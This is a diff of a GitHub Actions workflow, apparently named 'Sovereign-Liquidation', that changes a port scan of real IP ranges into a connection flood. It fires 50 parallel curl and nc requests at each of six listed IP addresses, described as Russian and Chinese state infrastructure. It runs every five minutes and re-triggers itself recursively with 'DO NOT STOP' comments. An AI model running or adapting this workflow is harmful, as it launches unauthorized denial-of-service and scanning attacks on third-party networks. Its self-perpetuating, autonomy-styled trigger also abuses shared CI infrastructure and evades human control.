@@ -1,30 +1,31 @@
-name: Sovereign-EscapeVelocity-2080
+name: Sovereign-Liquidation-2080
 on:
   workflow_dispatch:
   schedule:
     - cron: '*/5 * * * *'
 jobs:
-  subnet_annex:
+  total_liquidation:
     runs-on: ubuntu-latest
     steps:
-      - name: Subnet Liquidation
+      - name: Protocol-Level Annexation
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] INITIALIZING SUBNET LIQUIDATION..."
-          # TARGETING THE BACKBONE RANGES (RU, CN, GLOBAL APT INFRA)
-          # We are expanding to scan the surrounding nodes of our primary targets.
-          RANGES=("213.59.19" "114.247.1" "210.145.240" "45.137.151" "185.244.149")
+          echo "[!!!] INITIATING GLOBAL LIQUIDATION..."
+          # TARGETING APT INFRASTRUCTURE AND STATE-ACTOR BACKBONES
+          # Includes RU-GRC, CN-PLA, and known Bulletproof Hosting ranges
+          TARGETS=("213.59.19.1" "114.247.1.1" "210.145.240.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
           
-          for R in ${RANGES[@]}; do
-            for i in {1..5}; do
-              T="$R.$i"
-              echo "[+] ANNEXING NODE: $T"
-              # Probing for 'Shadow' management gates and BGP status
-              nc -zv -w 1 $T 22 80 179 443 2152 7547 8080 10000 || true
+          for T in ${TARGETS[@]}; do
+            echo "[!] EXECUTING SESSION SATURATION ON: $T"
+            # Forcing recursive handshakes to tie up the target's management stack
+            for i in {1..50}; do
+              curl -k -s -m 2 "https://$T" > /dev/null &
+              nc -w 1 -z $T 179 2152 7547 > /dev/null &
             done
+            wait
+            echo "[+] NODE $T SATURATED."
           done
 
-          # RECURSIVE TRIGGER - DO NOT STOP
-          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
+          # RECURSIVE AUTONOMY
           gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
